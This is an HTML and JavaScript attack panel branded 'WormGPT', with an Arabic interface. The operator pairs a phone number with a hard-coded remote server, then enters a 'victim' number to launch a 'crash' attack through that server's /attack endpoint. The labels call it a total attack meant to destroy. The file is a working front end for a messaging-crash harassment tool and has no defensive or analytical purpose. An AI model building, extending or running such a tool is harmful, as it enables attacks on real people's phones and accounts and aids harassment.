<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>WormGPT Panel</title>
    <style>
        body { background: #000; color: #f00; font-family: monospace; text-align: center; }
        .main { border: 2px solid #f00; display: inline-block; padding: 30px; margin-top: 50px; background: #0a0a0a; box-shadow: 0 0 15px #f00; }
        input { background: #111; color: #0f0; border: 1px solid #f00; padding: 12px; width: 260px; margin: 10px; }
        #pair-display { font-size: 40px; color: #fff; background: #222; padding: 15px; display: none; margin: 20px; border: 2px dashed #f00; }
        .btn { background: #f00; color: #fff; border: none; padding: 12px 25px; cursor: pointer; font-weight: bold; }
        .hidden { display: none; }
    </style>
</head>
<body>
    <div class="main">
        <h1>☢️ WORM-GPT CONSOLE ☢️</h1>
        
        <div id="setup">
            <p>أدخل رقمك للحصول على كود الربط:</p>
            <input type="text" id="myPhone" placeholder="9665xxxxxxxx">
            <br>
            <button class="btn" onclick="fetchCode()">طلب الكود</button>
            <div id="pair-display"></div>
            <p id="info">الكود سيظهر هنا وفي كونسول Katabump أيضاً.</p>
        </div>

        <div id="target-box" class="hidden">
            <h2 style="color: #0f0;">✅ تم الاتصال!</h2>
            <p>أدخل رقم الضحية لبدء الكراش:</p>
            <input type="text" id="victim" placeholder="9665xxxxxxxx">
            <br>
            <button class="btn" onclick="launch()">إطلاق الهجوم الشامل 🚀</button>
            <p id="log"></p>
        </div>
    </div>

    <script>
        const API = "http://51.75.118.79:20225";

        async function fetchCode() {
            const num = document.getElementById('myPhone').value;
            const display = document.getElementById('pair-display');
            display.style.display = "block";
            display.innerText = "جاري السحب...";

            try {
                const r = await fetch(`${API}/get-code?phone=${num}`);
                const d = await r.json();
                display.innerText = d.code;

                // فحص الربط كل 3 ثواني
                const interval = setInterval(async () => {
                    const statusR = await fetch(`${API}/check-status`);
                    const statusD = await statusR.json();
                    if (statusD.connected) {
                        clearInterval(interval);
                        document.getElementById('setup').classList.add('hidden');
                        document.getElementById('target-box').classList.remove('hidden');
                    }
                }, 3000);
            } catch (e) {
                display.innerText = "السيرفر لا يستجيب!";
            }
        }

        async function launch() {
            const vic = document.getElementById('victim').value;
            document.getElementById('log').innerText = "🔥 جاري التدمير...";
            await fetch(`${API}/attack?target=${vic}`);
            document.getElementById('log').innerText = "🏁 تم الهجوم!";
        }
    </script>
</body>
</html>
